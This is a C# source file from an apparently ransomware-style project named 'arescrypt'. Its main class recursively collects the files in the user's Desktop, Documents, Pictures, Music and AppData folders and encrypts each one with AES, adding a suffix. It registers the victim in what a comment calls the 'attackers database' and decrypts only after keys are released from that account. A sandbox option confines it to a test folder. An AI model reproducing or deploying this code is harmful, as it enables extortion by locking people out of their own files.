using System;
using System.IO;
using System.Collections.Generic;
using System.Security.Cryptography;
using System.Text;

namespace arescrypt
{
    class Queue
    {
        // Predefinitions
        static Configuration config = new Configuration(); // New instance of Configuration class
        static Cryptography crypto = new Cryptography(); // New instance of Cryptography class
        static UserData userData = new UserData();
        static AccountManager accountManager = new AccountManager();

        public List<string> GetRecursiveFiles()
        {
            // Preset our variables that will contain the
            // specified directories and files to encrypt.
            var userSpecificDirs = new List<string> { "" };
            
            // Check if sandboxing has been enabled in config
            // If so, only "encrypt" files in the "sandboxDirectory/" folder
            if (config.sandBox) // == true
                if (Directory.Exists(config.sandBoxDirectory))
                    userSpecificDirs.Add(config.sandBoxDirectory);
                else
                    Console.WriteLine("Sandbox mode was enabled, but no sandbox directory was discovered.\nPlease create this directory: " + config.sandBoxDirectory);
            else if (!config.sandBox)
            {
                // User specific directories, administrative rights shouldn't be required in order to write to these files
                userSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
                userSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments));
                userSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures));
                userSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic));
                userSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
            }

            // Preset variables for defining all discovered files
            var userSpecificFiles = new List<string> { };

            // Get all files in every directory specified above.
            // Then add to a List<string> (array)
            foreach (string dir in userSpecificDirs)
                foreach (string file in FileHandler.DirSearch(dir))
                    userSpecificFiles.Add(file);

            return userSpecificFiles;
        }

        /* BEGIN ENCRYPTION/DECRYPTION SECTION */
        public void EncryptAllFiles()
        {
            string[] fullFileIndex = GetRecursiveFiles().ToArray();

            using (AesManaged myAes = new AesManaged())
            {
                Cryptography.encKey = myAes.Key;
                Cryptography.encIV = myAes.IV;
            }

            accountManager.CreateUser(); // Create new user account in attackers database

            // Code for operation to run on all discovered files.
            // Remember, application may not have read/write access to all files.
            foreach (string file in fullFileIndex)
            {
                if (!file.Contains(".enc"))
                {
                    if (Cryptography.EncryptFile_Aes(file, Cryptography.encKey, Cryptography.encIV))
                    {
                        if (FileHandler.appendSuffixToFile(config.encryptedFileSuffix, file))
                            Console.WriteLine("File, " + file + ", was encrypted successfully.");
                    }
                }
            }
        }

        public void DecryptAllFiles()
        {
            UserData CryptoKeys = accountManager.GetCryptoKeys();
            string[] fullFileIndex = GetRecursiveFiles().ToArray();
            
            try
            {
                if (CryptoKeys.encKey != null && CryptoKeys.encKey != "")
                {
                    foreach (string file in fullFileIndex)
                    {
                        if (file.Contains(".enc"))
                        {
                            if (Cryptography.DecryptFile_Aes(file, Convert.FromBase64String(CryptoKeys.encKey.Replace(" ", "+")), Convert.FromBase64String(CryptoKeys.encIV.Replace(" ", "+"))))
                            {
                                if (FileHandler.subtractSuffixFromFile(config.encryptedFileSuffix, file))
                                    Console.WriteLine("File, " + file, ", was decrypted successfully.");
                            }
                            else
                                Console.WriteLine("file, " + file + ", couldn't be decrypted.");
                        }
                    }
                }
                else
                { Console.WriteLine("\nAccount has not been verified yet."); }
            } catch (Exception exc) { Console.WriteLine("\n\n-- Runtime Error --\nMessage: " + exc.Message + "\n" + exc.InnerException); }
        }
        /* END ENCRYPTION/DECRYPTION SECTION */
    }
}
